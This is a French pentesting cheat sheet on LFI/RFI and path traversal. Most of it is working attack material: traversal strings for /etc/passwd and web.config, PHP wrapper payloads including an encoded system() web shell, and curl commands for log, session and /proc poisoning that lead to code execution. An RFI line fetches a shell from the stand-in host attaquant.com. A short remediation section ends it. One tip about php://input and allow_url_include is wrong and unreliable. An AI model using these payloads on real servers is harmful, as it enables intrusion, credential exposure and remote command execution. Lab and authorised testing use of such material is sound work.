# LFI/RFI — inclusion de fichiers et traversée de répertoires

Cheat sheet d'exploitation des vulnérabilités Local/Remote File Inclusion et Path Traversal.

!!! warning "Cadre légal"
    Ces techniques ne doivent être mises en œuvre que dans un cadre légal explicite : laboratoire, CTF, ou test d'intrusion couvert par une autorisation écrite.

---

## Path Traversal & Local File Inclusion (LFI)

### Traversée de répertoires basique et avancée

```bash
../../../../etc/passwd                  # Traversée classique sous Linux (chemin relatif)
..\..\..\boot.ini                       # Équivalent Windows, séparateur backslash
....//....//....//etc/passwd            # Contourne un filtre remplaçant "../" une seule fois
/etc/passwd%00                          # Null byte bypass (PHP < 5.3.4 uniquement)
```

!!! tip "Nombre de remontées"
    Multipliez les séquences `../` sans crainte d'excès : dépasser la racine du système de fichiers ne provoque généralement aucune erreur, le chemin reste simplement bloqué à `/`.

### Fichiers cibles sensibles

| Système | Chemin | Intérêt |
|---|---|---|
| Linux | `/etc/passwd` | Liste des comptes utilisateurs du système |
| Linux | `/etc/issue` | Bannière d'identification de la distribution |
| Linux | `/proc/self/environ` | Variables d'environnement du processus web |
| Linux | `/var/log/auth.log` | Journal d'authentification (Debian/Ubuntu) |
| Windows | `C:\Windows\win.ini` | Fichier de configuration système standard |
| Windows | `C:\inetpub\wwwroot\web.config` | Configuration IIS, potentiellement des secrets |

```bash
curl "http://cible.com/page.php?file=../../../../etc/passwd"    # Test direct via curl
curl "http://cible.com/page.php?file=..\..\..\..\windows\win.ini"  # Variante Windows
```

---

## Wrappers PHP pour la lecture et l'exécution

### Exfiltration de code source (Base64)

```bash
php://filter/read=convert.base64-encode/resource=index.php
# Encode le fichier cible en Base64 avant affichage, contournant l'exécution PHP native
```

!!! tip "Pourquoi Base64 et pas le fichier brut ?"
    Inclure directement un fichier `.php` l'exécute au lieu de l'afficher. Le wrapper `php://filter` avec encodage Base64 permet de lire le code source sans déclencher son interprétation par le moteur PHP.

### Exécution de code à la volée

```bash
php://input
# Exécute le corps de la requête HTTP POST comme code PHP, si include($_GET['file']) est vulnérable

data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
# Injecte directement du PHP encodé en Base64 via le wrapper data://
```

```bash
curl -X POST "http://cible.com/page.php?file=php://input" \
  --data '<?php system($_GET["cmd"]); ?>'
# Combine php://input avec un payload PHP dans le corps de la requête POST
```

!!! warning "Prérequis serveur"
    Le wrapper `php://input` nécessite `allow_url_include = Off` fonctionnel (il n'est pas concerné par cette directive) mais reste soumis à `allow_url_fopen` et à la configuration générale des wrappers PHP.

---

## Escalade d'une LFI vers une RCE

### Log Poisoning

Injecte du code PHP dans un journal serveur via un champ contrôlé (User-Agent, referer, identifiants), puis inclut ce journal via la LFI.

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://cible.com/"
# Injecte le payload PHP dans le User-Agent, journalisé par le serveur web
```

```bash
curl "http://cible.com/page.php?file=../../../var/log/apache2/access.log&cmd=id"
# Inclut le journal Apache empoisonné, exécutant le payload injecté
curl "http://cible.com/page.php?file=../../../var/log/nginx/access.log&cmd=id"
# Variante pour un serveur Nginx
curl "http://cible.com/page.php?file=../../../var/log/sshd.log&cmd=id"
# Empoisonnement via un nom d'utilisateur SSH contenant du code PHP (tentative de connexion)
```

!!! tip "Droits de lecture requis"
    Le compte exécutant le serveur web doit disposer des droits de lecture sur les journaux ciblés, ce qui n'est pas garanti selon le durcissement du système (logs souvent réservés à `root` ou `adm`).

### PHP Session Poisoning

```bash
curl -b "PHPSESSID=abc123" "http://cible.com/" \
  --data "user=<?php system(\$_GET['cmd']); ?>"
# Injecte le payload dans une donnée de session persistée côté serveur
```

```bash
curl "http://cible.com/page.php?file=/tmp/sess_abc123&cmd=id"
# Inclut le fichier de session empoisonné pour exécuter le payload
```

### `/proc/self/environ` & `/proc/self/cmdline`

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" "http://cible.com/"
# Injecte le payload dans le User-Agent, repris dans les variables d'environnement
curl "http://cible.com/page.php?file=/proc/self/environ&cmd=id"
# Inclut les variables d'environnement du processus PHP, exécutant le payload injecté
```

!!! warning "Éphémère et peu fiable"
    `/proc/self/environ` correspond au processus courant : la technique fonctionne surtout sous les anciens modèles CGI, rarement sous PHP-FPM ou mod_php modernes où le processus diffère entre les requêtes.

---

## Remote File Inclusion (RFI)

Permet d'inclure et d'exécuter un fichier hébergé sur un serveur distant contrôlé par l'attaquant.

```bash
http://cible.com/page.php?file=http://attaquant.com/shell.txt
# Inclut et exécute un shell PHP hébergé à distance
http://cible.com/page.php?file=http://attaquant.com/shell.txt?
# Le "?" final neutralise une extension .php ajoutée par l'application vulnérable
```

```php
// Contenu type de shell.txt (extension volontairement non .php pour éviter le blocage)
<?php system($_GET['cmd']); ?>
```

!!! warning "Directives PHP requises"
    Une RFI n'est exploitable que si `allow_url_include = On` dans `php.ini`, une configuration désactivée par défaut depuis PHP 5.2 en raison de son risque critique. `allow_url_fopen = On` est également nécessaire.

---

## Contournement de filtres & remédiation

### Techniques de bypass

| Technique | Exemple | Principe |
|---|---|---|
| Double encoding | `%252e%252e%252f` | `%25` se décode en `%`, révélant `%2e%2e%2f` après un second passage |
| Null byte | `../../etc/passwd%00` | Tronque la chaîne après le null byte (PHP < 5.3.4 uniquement) |
| Overlong UTF-8 | `%c0%ae%c0%ae%c0%af` | Encodage UTF-8 non canonique de `../`, parfois accepté par un décodeur laxiste |
| Suffixe absorbé | `....//....//etc/passwd` | Contourne un remplacement naïf et non récursif de `../` |

```bash
curl "http://cible.com/page.php?file=..%252f..%252f..%252fetc%252fpasswd"
# Double encodage de "../" pour contourner un WAF décodant une seule fois
```

!!! tip "Tester plusieurs variantes systématiquement"
    Un filtre peut bloquer `../` en clair tout en laissant passer sa version encodée, doublement encodée, ou mêlée à des séquences absorbées. Automatiser ces variantes via `ffuf` ou `wfuzz` accélère considérablement la détection.

### Bonnes pratiques de développement

| Mesure | Principe |
|---|---|
| **Whitelisting** | N'accepter qu'un ensemble fini et prédéfini de noms de fichiers, jamais un chemin arbitraire |
| **Désactivation des wrappers dangereux** | Restreindre `allow_url_include`, `allow_url_fopen` au strict nécessaire |
| **Normalisation stricte du chemin** | Résoudre le chemin réel (`realpath()`) et vérifier qu'il reste dans le répertoire autorisé |
| **Moindre privilège** | Le compte exécutant l'application ne doit pas avoir accès en lecture aux journaux système ni aux fichiers sensibles |

```php
// Vulnérable : chemin utilisateur directement inclus
include($_GET['file']);

// Sécurisé : whitelist stricte des pages autorisées
$pages = ['accueil', 'contact', 'apropos'];
if (in_array($_GET['page'], $pages)) {
    include($_GET['page'] . '.php');
}
```

---

## Voir aussi

- OWASP Testing Guide — chapitre Path Traversal / File Inclusion
- Fiche complémentaire : `sqli.md` pour les injections côté base de données
